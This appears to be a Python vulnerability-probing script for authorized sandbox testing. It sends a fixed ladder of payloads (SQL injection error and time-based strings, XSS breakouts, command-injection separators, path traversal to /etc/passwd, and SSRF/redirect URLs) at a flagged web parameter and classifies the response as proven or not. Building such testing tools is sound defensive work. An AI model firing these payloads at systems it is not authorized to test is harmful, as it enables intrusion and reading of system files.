#!/usr/bin/env python3
"""Targeted payload prober — runs INSIDE the sandbox attacker container.

For authorized security testing of the operator's own app in an isolated, egress-free sandbox only.
It fires a small set of standard, non-destructive detection payloads at the exact route+param a
specialist flagged, and decides "proven / not proven" from the response. It does not generate
exploits: the payloads are a fixed library, and markers/arithmetic are used so a plain input echo is
not mistaken for a real hit. Stdlib only, so it runs in a bare python:3.12-slim container.

Usage (the host runs this via `docker compose exec attacker`):
    python cyphex_probe.py http://target:3000 '[{"id","method","route","param","cwe"}, ...]'
    -> {"results": [{"id","proven","evidence"}, ...]}  on stdout
"""
from __future__ import annotations

import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

_SQL_ERRS = ("sql syntax", "sqlstate", "psql:", "sqlite3.", "ora-0", "mysql_fetch", "unterminated", "pg::", "syntax error at or near")
_PASSWD = re.compile(r"root:.?:0:0:")
MARK = "cx" + "7q3"  # a token unlikely to occur naturally; computed results use arithmetic, not this


def _probes(cwe: str, marker: str) -> list[dict]:
    """Fixed escalation ladder per bug class: cheap/high-signal first, then blind, then variants.
    probe_one fires them in order and stops at the first proof. Nothing here is model-authored and
    nothing destructive (time delays, arithmetic, reading /etc/passwd) — it is a fixed library."""
    c = (cwe or "").upper()
    if c == "CWE-89":   # SQL injection: error breakers -> time-based across dialects (blind, reliable)
        ladder = [{"value": v, "kind": "sql_err"} for v in ("'", "'\"", "')", "'))", "`", "\\")]
        ladder += [{"value": v, "kind": "sql_time"} for v in (
            "' OR SLEEP(3)-- -", "\" OR SLEEP(3)-- -", "') OR SLEEP(3)-- -",
            "' OR pg_sleep(3)-- -", "'; SELECT pg_sleep(3)-- -", "1 OR SLEEP(3)",
            "' AND 1=(SELECT 1 FROM (SELECT SLEEP(3))x)-- -")]
        return ladder
    if c == "CWE-79":   # reflected XSS: escalate the breakout context; proof is the payload coming back unescaped
        return [{"value": p, "kind": "xss"} for p in (
            f"<svg/onload=alert('{marker}')>",
            f"\"><svg/onload=alert('{marker}')>",
            f"'><svg/onload=alert('{marker}')>",
            f"</script><script>alert('{marker}')</script>",
            f"javascript:alert('{marker}')")]
    if c == "CWE-78":   # command injection: arithmetic a plain echo cannot produce, across separators
        return [{"value": v, "kind": "cmd", "expect": "1339"} for v in (
            ";expr 13 \\* 103;", "$(expr 13 \\* 103)", "`expr 13 \\* 103`",
            "|expr 13 \\* 103", "&& expr 13 \\* 103", "\nexpr 13 \\* 103")]
    if c == "CWE-22":   # path traversal: depth, then encodings
        return [{"value": v, "kind": "path"} for v in (
            "../../../../../../etc/passwd", "....//....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/etc/passwd", "..%252f..%252f..%252fetc%252fpasswd")]
    if c in ("CWE-601", "CWE-918"):  # open redirect / SSRF: off-target URL, then parser-confusion variants
        return [{"value": v, "kind": "redirect"} for v in (
            "http://cyphex-oob.invalid/x", "//cyphex-oob.invalid/x", "https:cyphex-oob.invalid",
            "http:/cyphex-oob.invalid", "/\\cyphex-oob.invalid")]
    return []


def _verdict(kind: str, sent: str, resp: dict, marker: str) -> bool:
    body, elapsed = resp["body"].lower(), resp["elapsed"]
    if kind == "sql_err":
        return any(s in body for s in _SQL_ERRS)
    if kind == "sql_time":
        return elapsed > 2.5  # the SLEEP(3) ran; a normal route returns in well under this
    if kind == "xss":
        return sent.lower() in body  # the breakout payload came back unescaped (marker makes it unique)
    if kind == "cmd":
        return False  # handled with `expect` in the caller
    if kind == "path":
        return bool(_PASSWD.search(resp["body"]))
    if kind == "redirect":
        loc = resp["headers"].get("location", "")
        return "cyphex-oob.invalid" in loc or "cyphex-oob.invalid" in body
    return False


def _fire(base: str, method: str, route: str, param: str, value: str, timeout: int = 8) -> dict:
    route = route if route.startswith("/") else "/" + route
    if (method or "GET").upper() == "POST":
        data = json.dumps({param: value}).encode()
        req = urllib.request.Request(base + route, data=data, method="POST",
                                     headers={"Content-Type": "application/json"})
    else:
        url = base + route + ("&" if "?" in route else "?") + urllib.parse.urlencode({param: value})
        req = urllib.request.Request(url, method="GET")
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body, status, headers = r.read(200_000).decode("utf-8", "replace"), r.status, dict(r.headers)
    except urllib.error.HTTPError as e:
        body, status, headers = e.read(200_000).decode("utf-8", "replace"), e.code, dict(e.headers)
    except Exception as e:  # noqa: BLE001 — a connection error is just "not proven", not a crash
        body, status, headers = f"__error__ {e!r}", 0, {}
    return {"body": body, "status": status, "elapsed": time.time() - t0,
            "headers": {k.lower(): v for k, v in headers.items()}}


def probe_one(base: str, t: dict) -> dict:
    marker = MARK
    for p in _probes(t.get("cwe", ""), marker):
        resp = _fire(base, t.get("method", "GET"), t.get("route", "/"), t.get("param", ""), p["value"])
        hit = (p["expect"] in resp["body"]) if p.get("expect") else _verdict(p["kind"], p["value"], resp, marker)
        if hit:
            ev = f"fired {p['value']!r} at {t.get('method','GET')} {t.get('route')}?{t.get('param')} -> {p['kind']} proven (HTTP {resp['status']}, {resp['elapsed']:.1f}s)"
            return {"id": t.get("id"), "proven": True, "evidence": ev}
    return {"id": t.get("id"), "proven": False, "evidence": f"payloads fired at {t.get('route')}?{t.get('param')}; none proved it"}


def run(base: str, targets: list[dict]) -> list[dict]:
    return [probe_one(base, t) for t in targets if t.get("route") and t.get("param")]


def _selftest() -> None:
    # classifier is pure: check it reacts to canned responses without any network
    assert _verdict("sql_err", "'", {"body": "You have an error in your SQL syntax", "elapsed": 0.1, "headers": {}}, MARK)
    assert _verdict("sql_time", "x", {"body": "", "elapsed": 3.2, "headers": {}}, MARK)
    assert not _verdict("sql_time", "x", {"body": "", "elapsed": 0.2, "headers": {}}, MARK)
    assert _verdict("path", "x", {"body": "root:x:0:0:root:/root", "elapsed": 0.1, "headers": {}}, MARK)
    assert _verdict("redirect", "x", {"body": "", "elapsed": 0.1, "headers": {"location": "http://cyphex-oob.invalid/x"}}, MARK)
    assert _verdict("xss", "x", {"body": f"<svg/onload=alert('{MARK}')>", "elapsed": 0.1, "headers": {}}, MARK)
    assert not _verdict("xss", "x", {"body": "&lt;svg/onload...", "elapsed": 0.1, "headers": {}}, MARK)
    assert len(_probes("CWE-89", MARK)) == 13 and len(_probes("CWE-22", MARK)) == 6 and _probes("", MARK) == []
    assert all(p.get("expect") == "1339" for p in _probes("CWE-78", MARK))
    print("probe_kit selftest ok")


if __name__ == "__main__":
    if "--selftest" in sys.argv:
        _selftest()
    else:
        base_url = sys.argv[1]
        targets = json.loads(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2] else json.load(sys.stdin)
        print(json.dumps({"results": run(base_url, targets)}))
